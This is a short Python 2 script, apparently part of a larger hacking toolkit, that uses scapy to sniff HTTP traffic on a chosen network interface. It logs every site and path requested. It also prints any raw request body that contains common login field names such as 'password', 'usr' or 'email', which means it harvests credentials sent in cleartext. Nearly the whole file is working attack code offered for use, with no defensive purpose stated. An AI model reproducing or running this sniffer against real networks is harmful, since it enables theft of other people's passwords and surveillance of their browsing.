from scapy import all as scapy 
from scapy_http import http 
from urlparse import unquote
from appearance.hue import *
 
# keywords guessing the variable use for username and password
keywords = ['pass', 'password', 'usr', 'username', 'user', 'pwd', "Username", "Password", "User", "Pass", "Email", "email", "txtUser", "pswd", "txtUsername", "pswrd"]
 

def processing_data(pkt):
    if pkt.haslayer(http.HTTPRequest): 
        print(info("Website: " + pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path))
        if pkt.haslayer(scapy.Raw): 
            for keyword in keywords: 
                if keyword in str(pkt[scapy.Raw]): 
                    print (good("Possible username/password found:"))
                    print (pkt[scapy.Raw]) 
                    print ("-" * 21) # whats 9 + 10. 21 lol)
                    break
 
def sniff_http(interface, filter):
    return scapy.sniff(iface=interface, store=True, prn=processing_data, filter=filter)

def run_http_sniffer():
    interface = raw_input(que("Interface to sniff: "))
    print (run("Sniffing on: " + interface))
    sniff_http(interface, "")
